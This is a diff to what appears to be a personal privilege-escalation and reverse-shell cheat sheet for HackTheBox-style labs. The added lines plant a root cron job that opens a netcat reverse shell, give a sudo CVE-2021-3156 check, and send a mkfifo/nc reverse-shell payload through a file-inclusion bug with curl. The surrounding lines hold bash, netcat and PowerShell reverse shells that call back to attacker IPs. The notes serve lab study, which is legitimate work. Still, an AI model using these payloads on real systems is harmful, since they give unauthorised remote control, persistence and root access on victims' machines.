@@ -200,7 +200,9 @@ system("/bin/bash");
 	- `/etc/cron.d`
 	- `/var/spool/cron/crontabs/root`
 	- some permissions might be sated niside some file there.
-
+```shell
+cp /etc/crontab . && echo '* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.149 1234 >/tmp/f ' >> crontab
+```
 #### 6) PATH exploiting
 - create a c program in your home, with name "path"
 ```C
@@ -238,6 +240,10 @@ void main()
 hnathan26@htb[/htb]$ sudo -l 
 	(user : user) NOPASSWD: /bin/echo
 ```
+- You can Check if Machine is Vulnerable for ` sudo 1.8.31 ` - **CVE-2021-3156**
+	- `sudoedit -s Y`
+		- If it asks for your password it's most likely vulnerable, 
+		- if it prints usage information it isn't.
 - To run commands as another user
 - `sudo -u user /bin/echo Hello World!`
 ```shell
@@ -263,6 +269,10 @@ root
 ### bash Reverse Shell
 - `bash -i >& /dev/tcp/10.10.16.22/4443 0>&1`	  
 - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.125 4444 >/tmp/f`
+```shell
+# If it is on LFI
+curl http://10.10.10.150/index.php -G --data-urlencode 'pwn=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 1234 >/tmp/f '
+```
 ### powershell Reverse Shell
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('10.10.15.78',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()
